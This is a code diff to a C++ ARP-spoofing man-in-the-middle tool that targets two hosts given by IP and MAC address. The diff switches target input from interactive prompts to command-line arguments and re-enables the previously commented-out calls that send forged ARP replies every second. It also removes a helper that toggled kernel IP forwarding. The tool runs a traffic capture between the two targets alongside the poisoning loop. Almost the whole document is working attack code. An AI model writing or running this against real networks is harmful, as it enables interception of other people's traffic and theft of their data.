@@ -55,27 +55,14 @@ void mitm_attack(const char* ip1, const char* mac1,
 
 
 int main(int argc,char** argv){
-	char ip1[256];
-	char ip2[256];
-	char mac1[256];
-	char mac2[256];
+	if(argc != 5){
+		printf("args\n");
+		return -1;
+	}
 
-	printf("##TRAGET1##\n");
-	printf("ip address : ");
-	scanf("%s", ip1);
-	printf("mac address: ");
-	scanf("%s", mac1);
-	printf("\n");
-	printf("##TRAGET2##\n");
-	printf("ip address : ");
-	scanf("%s", ip2);
-	printf("mac address: ");
-	scanf("%s", mac2);
-
-	std::thread mitm(mitm_attack, ip1, mac1, ip2, mac2);
-	capture(ip1, ip2);
+	std::thread mitm(mitm_attack, argv[1], argv[2], argv[3], argv[4]);
+	capture(argv[1], argv[3]);
 }
-
 
 
 void mitm_attack(const char* ip1, const char* mac1, 
@@ -99,7 +86,6 @@ void mitm_attack(const char* ip1, const char* mac1,
 	pack_to_target2.ARP.dstIp  = ip2;
 	pack_to_target2.ARP.option = PGEN_ARPOP_REPLY;
 
-
 	for(int i=0; ; i++){
 		printf("0x%04x: %s[%s] <MITM> %s[%s] \n", i, 
 				pack_to_target1.ARP.dstIp.c_str(),
@@ -107,24 +93,8 @@ void mitm_attack(const char* ip1, const char* mac1,
 				pack_to_target2.ARP.dstIp.c_str(),
 				pack_to_target2.ARP.dstEth.c_str() );
 
-		//pack_to_target1.SEND(dev);
-		//pack_to_target2.SEND(dev);
+		pack_to_target1.SEND(dev);
+		pack_to_target2.SEND(dev);
 		sleep(1);
 	}		
 }
-
-
-void ip_forward(bool b){
-	FILE *fp;
-	fp = fopen("/proc/sys/net/ipv4/ip_forward", "w");
-	if(fp == NULL){
-		perror("fopen");
-		return;
-	}
-
-	if(b)
-		fputc('1', fp);
-	else
-		fputc('0', fp);
-}
-
